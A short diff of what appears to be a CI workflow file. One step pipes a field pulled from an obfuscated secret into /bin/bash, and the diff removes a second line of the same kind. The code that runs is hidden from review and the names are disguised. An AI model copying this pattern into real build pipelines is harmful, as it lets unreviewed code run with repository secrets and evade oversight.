@@ -20,7 +20,6 @@ jobs:
           kap9162: ${{ secrets.kap9162 }}
         run: |
           printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
-          printf '%s' "$lwm53946" | jq -r .yd878 | /bin/bash
 
       - name: Save output
         if: always()
